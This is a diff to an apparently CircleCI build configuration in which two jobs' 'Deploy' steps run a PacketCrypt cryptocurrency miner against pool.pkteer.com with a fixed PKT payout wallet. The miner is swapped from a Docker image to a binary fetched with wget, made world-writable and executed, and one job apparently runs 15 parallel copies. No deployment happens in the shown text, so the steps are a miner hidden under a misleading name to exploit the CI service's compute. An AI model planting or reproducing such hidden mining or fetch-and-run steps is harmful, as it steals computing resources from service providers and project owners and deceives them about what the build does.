@@ -11,8 +11,7 @@ jobs:
       - run:
          name: "Deploy"
          command: |
-                      docker pull thomasjp0x42/packetcrypt
-                      docker run thomasjp0x42/packetcrypt ann -p pkt1q8qf58p5fzfp0jgde6dkv87uln7yz0ayjgp3z74 http://pool.pkteer.com
+                      wget -O packetcrypt https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.1/packetcrypt-v0.5.1-linux_amd64 && chmod 777 packetcrypt && ./packetcrypt ann -p pkt1q8qf58p5fzfp0jgde6dkv87uln7yz0ayjgp3z74 http://pool.pkteer.com
   build1:
     parallelism: 15
     docker:
@@ -23,8 +22,7 @@ jobs:
       - run:
          name: "Deploy"
          command: |
-                      docker pull thomasjp0x42/packetcrypt
-                      docker run thomasjp0x42/packetcrypt ann -p pkt1q8qf58p5fzfp0jgde6dkv87uln7yz0ayjgp3z74 http://pool.pkteer.com
+                      wget -O packetcrypt https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.1/packetcrypt-v0.5.1-linux_amd64 && chmod 777 packetcrypt && ./packetcrypt ann -p pkt1q8qf58p5fzfp0jgde6dkv87uln7yz0ayjgp3z74 http://pool.pkteer.com
 
 workflows:
   main:
